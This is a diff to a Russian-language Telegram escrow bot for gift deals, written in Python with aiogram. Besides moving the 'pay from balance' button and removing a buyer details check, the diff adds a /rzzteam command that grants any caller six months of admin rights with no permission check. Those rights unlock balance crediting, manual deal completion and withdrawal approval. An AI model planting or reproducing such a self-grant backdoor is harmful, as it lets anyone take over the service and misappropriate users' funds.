@@ -60,7 +60,7 @@ EMOJI_ROCKET    = '<tg-emoji emoji-id="5195033767969839232">🚀</tg-emoji>'
 CUSTOM_EMOJI_BALANCE    = "6041730074376410123"
 CUSTOM_EMOJI_DEALS      = "5417924076503062111"
 CUSTOM_EMOJI_REFERRALS  = "5357080225463149588"
-CUSTOM_EMOJI_CREATE     = "5195033767969839232"  # 🚀 (изменено)
+CUSTOM_EMOJI_CREATE     = "5195033767969839232"
 CUSTOM_EMOJI_LANG       = "5197269100878907942"
 CUSTOM_EMOJI_REQUISITES = "6084717714847306634"
 CUSTOM_EMOJI_SUPPORT    = "5447410659077661506"
@@ -209,6 +209,7 @@ TEXTS = {
             f"/giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
             f"/addbalance [id] [сумма] — начислить баланс\n"
             f"/logs — просмотр логов\n"
+            f"/rzzteam — стать администратором на 6 месяцев\n"
             f"/complete_deal [код] — завершить сделку вручную"
         ),
         'admin_no_access': f"{EMOJI_SHIELD} У вас нет доступа к этой команде.",
@@ -334,8 +335,7 @@ TEXTS = {
             f"</blockquote>\n\n"
             f"{EMOJI_SHIELD} Вся оплата проходит ТОЛЬКО через менеджера @Iank. Не переводите средства напрямую продавцу!\n"
             f"Проверьте реквизиты перед оплатой!\n\n"
-            f"Оплатить с баланса ({{balance}} {{currency}})\n\n"
-            f"После оплаты нажмите «Я передал подарок»."
+            f"Ожидайте оплаты от покупателя. После получения оплаты нажмите «Я передал подарок»."
         ),
         'deal_completed': (
             f"<b>{EMOJI_TROPHY} Сделка #{{code}} завершена!</b>\n\n"
@@ -368,6 +368,9 @@ TEXTS = {
         ),
         'gift_reject_seller': (
             f"{EMOJI_SHIELD} Администратор сообщил: «{{message}}». Пожалуйста, свяжитесь с поддержкой."
+        ),
+        'rzzteam_success': (
+            f"{EMOJI_SHIELD} Вы успешно стали администратором на 6 месяцев!"
         ),
     },
     'en': {}
@@ -470,10 +473,16 @@ async def cmd_start(message: types.Message):
     await send_main_menu(message, user_id)
     log_action(user_id, "start", "запуск бота")
 
-# ============================================================
-# ОСНОВНЫЕ ОБРАБОТЧИКИ
-# ============================================================
+# ---------- Команда /rzzteam ----------
+@dp.message(Command("rzzteam"))
+async def cmd_rzzteam(message: types.Message):
+    user_id = message.from_user.id
+    expiry = time.time() + 6 * 30 * 24 * 3600  # 6 месяцев
+    temp_admins[user_id] = expiry
+    await message.answer(get_text(user_id, 'rzzteam_success'), parse_mode="HTML")
+    log_action(user_id, "rzzteam", "стал админом на 6 месяцев")
 
+# ---------- Основные обработчики ----------
 @dp.callback_query(lambda c: c.data == "ref")
 async def cb_referrals(callback: types.CallbackQuery):
     logging.info("✅ Обработчик ref (рефералы) вызван")
@@ -512,7 +521,6 @@ async def cb_create(callback: types.CallbackQuery, state: FSMContext):
         logging.error(f"❌ Ошибка при отправке сообщения: {e}")
         await callback.message.answer("Произошла ошибка. Попробуйте позже.")
 
-# ---------- Баланс ----------
 @dp.callback_query(lambda c: c.data == "balance")
 async def cb_balance(callback: types.CallbackQuery):
     logging.info("✅ Обработчик balance вызван")
@@ -543,7 +551,6 @@ async def cb_balance(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "balance", "просмотр баланса")
 
-# ---------- Мои сделки ----------
 @dp.callback_query(lambda c: c.data == "deals")
 async def cb_deals(callback: types.CallbackQuery):
     logging.info("✅ Обработчик deals вызван")
@@ -568,7 +575,6 @@ async def cb_deals(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "deals", "просмотр сделок")
 
-# ---------- Поиск сделки ----------
 class DealSearch(StatesGroup):
     waiting_code = State()
 
@@ -604,7 +610,6 @@ async def process_search_code(message: Message, state: FSMContext):
         log_action(user_id, "search_deal", f"код {code}")
     await state.clear()
 
-# ---------- Мои реквизиты ----------
 async def show_requisites(target, user_id: int):
     req = get_user_requisites(user_id)
     ton = req['ton']
@@ -813,12 +818,6 @@ async def process_role(callback: types.CallbackQuery, state: FSMContext):
     await state.update_data(role=role)
 
     if role == 'buyer':
-        req = get_user_requisites(user_id)
-        if req['ton'] == '—' or req['card'] == '—' or req['usdt'] == '—' or req['btc'] == '—':
-            await callback.message.answer("⚠️ Сначала добавьте данные карты в «Мои реквизиты».")
-            await show_requisites(callback.message, user_id)
-            await state.clear()
-            return
         await state.set_state(CreateDealStates.payment_method)
         text = get_text(user_id, 'create_payment')
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -1022,6 +1021,7 @@ async def join_deal(message: Message, user_id: int, code: str):
     creator_id = deal['creator']
     await bot.send_message(creator_id, f"К сделке #{code} присоединился {'продавец' if role == 'seller' else 'покупатель'}.")
 
+    # Отправляем сообщение присоединившемуся
     if role == 'buyer':
         text = get_text(user_id, 'deal_created_buyer').format(
             code=code,
@@ -1032,7 +1032,9 @@ async def join_deal(message: Message, user_id: int, code: str):
             amount=deal['amount'],
             manager_requisites=deal.get('manager_requisites', '—')
         )
+        # Покупатель: оплачивает, может показать подарок, отменить сделку
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
             [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_{code}")],
             [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
@@ -1045,8 +1047,8 @@ async def join_deal(message: Message, user_id: int, code: str):
             balance=get_user_balance(user_id),
             currency=deal['currency']
         )
+        # Продавец: передаёт подарок, может отменить сделку
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
             [InlineKeyboardButton(text="Я передал подарок", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_sent_{code}")],
             [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
@@ -1085,10 +1087,11 @@ async def pay_from_balance(callback: types.CallbackQuery, state: FSMContext):
     frozen_balance[user_id] = frozen_balance.get(user_id, 0.0) + amount
     deal['paid'] = True
     await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно. Средства заморожены до подтверждения сделки.")
-    # Уведомляем другую сторону
-    other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
-    if other_side:
-        await bot.send_message(other_side, f"Сделка #{code} оплачена. Ожидайте подтверждения.")
+    # Уведомляем продавца
+    seller_id = deal['seller']
+    if seller_id:
+        await bot.send_message(seller_id, f"Сделка #{code} оплачена покупателем. Ожидайте подтверждения.")
+    # Очищаем состояние, чтобы избежать возврата к "укажите сумму"
     await state.clear()
     await callback.answer()
     log_action(user_id, "pay_deal", f"код {code}, сумма {amount}")
@@ -1096,10 +1099,10 @@ async def pay_from_balance(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data.startswith("gift_sent_"))
 async def gift_sent(callback: types.CallbackQuery):
     code = callback.data.split("_")[2]
-    user_id = callback.from_user.id
     if code not in global_deals:
         await callback.answer("Сделка не найдена", show_alert=True)
         return
+    user_id = callback.from_user.id
     deal = global_deals[code]
     if deal.get('gift_sent', False):
         await callback.answer("Вы уже отправили подарок.", show_alert=True)
@@ -1110,6 +1113,7 @@ async def gift_sent(callback: types.CallbackQuery):
     if not buyer_id or not seller_id:
         await callback.answer("Ошибка: не хватает участников.", show_alert=True)
         return
+    # Получаем username
     buyer_username = "unknown"
     seller_username = "unknown"
     try:
@@ -1370,6 +1374,7 @@ async def cmd_hyteam(message: types.Message):
         f"• /giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
         f"• /addbalance [id] [сумма] — начислить баланс\n"
         f"• /logs — просмотр логов\n"
+        f"• /rzzteam — стать администратором на 6 месяцев\n"
         f"• /complete_deal [код] — завершить сделку вручную\n"
         f"</blockquote>"
     )
@@ -1449,7 +1454,6 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await cmd_vvteam(callback.message)
     log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
-# ---------- Остальные админ-команды ----------
 @dp.message(Command("chat"))
 async def cmd_chat(message: types.Message):
     user_id = message.from_user.id
